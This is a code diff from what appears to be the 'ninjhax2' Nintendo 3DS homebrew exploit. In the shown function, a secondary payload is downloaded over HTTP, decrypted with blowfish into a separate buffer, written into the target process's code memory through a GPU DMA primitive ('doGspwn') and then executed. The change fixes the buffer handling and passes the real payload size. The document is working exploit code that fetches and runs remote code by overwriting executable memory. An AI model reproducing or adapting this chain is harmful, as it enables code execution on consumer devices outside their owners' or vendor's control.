@@ -286,9 +286,10 @@ int _main()
 
 	// drawHex(ret,0,line+=10);
 
-	u8* buffer=(u8*)0x14100000;
+	u8* buffer0=(u8*)0x14300000;
+	u8* buffer1=(u8*)0x14100000;
 	u32 secondaryPayloadSize=0x0;
-	ret=HTTPC_ReceiveData(httpcHandle2, httpContextHandle, buffer, 0x300000);
+	ret=HTTPC_ReceiveData(httpcHandle2, httpContextHandle, buffer0, 0x300000);
 	if(ret)*(u32*)NULL=0xC0DE0005;
 	ret=HTTPC_GetDownloadSizeState(httpcHandle2, httpContextHandle, &secondaryPayloadSize);
 	if(ret)*(u32*)NULL=0xC0DE0006;
@@ -305,26 +306,25 @@ int _main()
 	Result (*blowfishDecrypt)(u32* blowfishKeyData, u32* src, u32* dst, u32 size)=(void*)0x001A4B04;
 
 	blowfishKeyScheduler((u32*)0x14200000);
-	blowfishDecrypt((u32*)0x14200000, (u32*)buffer, (u32*)buffer, secondaryPayloadSize);
+	blowfishDecrypt((u32*)0x14200000, (u32*)buffer0, (u32*)buffer1, secondaryPayloadSize);
 
 	Result (*_DSP_UnloadComponent)(Handle* handle)=(void*)0x002BA368;
 	Handle** dspHandle=(Handle**)0x334EFC;
 
 	_DSP_UnloadComponent(*dspHandle);
 
-	ret=_GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, (u32*)buffer, 0x300000);
+	ret=_GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, (u32*)buffer1, 0x300000);
 	// drawHex(ret,0,line+=10);
 
-	doGspwn((u32*)(buffer), (u32*)(0x14000000+CN_TEXTPAOFFSET), 0x0000A000);
+	doGspwn((u32*)(buffer1), (u32*)(0x14000000+CN_TEXTPAOFFSET), secondaryPayloadSize);
 
 	svc_sleepThread(0x3B9ACA00);
 
 	// drawString(TOPFBADR1,"ninjhax2",100,0);
 	// drawString(TOPFBADR2,"ninjhax2",100,0);
 
-	void (*reset)(void)=(void*)0x00100000;
-	reset();
+	void (*reset)(u32 size)=(void*)0x00100000;
+	reset(secondaryPayloadSize);
 
-	while(1);
 	return 0;
 }
